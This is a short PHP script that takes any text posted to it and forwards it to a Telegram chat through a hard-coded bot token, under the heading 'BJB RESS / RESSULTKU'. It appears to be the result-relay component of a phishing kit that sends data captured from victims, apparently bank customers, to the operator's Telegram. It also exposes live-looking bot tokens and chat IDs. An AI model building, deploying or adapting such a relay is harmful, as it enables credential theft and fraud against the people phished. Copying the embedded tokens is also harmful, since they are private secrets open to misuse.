<?php
header('Access-Control-Allow-Origin: *');
// $token = "7384716877:AAH6URsrZNPjE7l1qOggoyfcSldP_oe1eZw";
// $chatID = "6785339214";
$token = "7307507640:AAHiNY13rBsGmnm3cJXEddJHQLmerLDpsvs";
$chatID = "6247626944";
$content = $_POST['message'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺BJB RESS༻────━─━\n\n(BJB | RESSULTKU)\n\n".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
echo $server_output;
